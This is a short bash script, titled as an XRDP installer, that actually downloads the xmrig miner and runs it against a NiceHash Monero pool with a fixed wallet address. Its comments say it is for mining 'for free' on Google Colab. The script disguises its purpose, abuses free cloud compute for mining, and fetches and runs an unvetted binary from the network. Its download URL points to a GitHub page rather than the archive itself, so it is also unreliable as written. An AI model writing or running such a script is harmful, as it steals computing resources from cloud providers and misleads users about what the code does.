#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/MahirAlam/rdps/blob/main/xmrig.zip
unzip xmrig.zip
cd xmrig-6.16.4
./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash -a rx/0
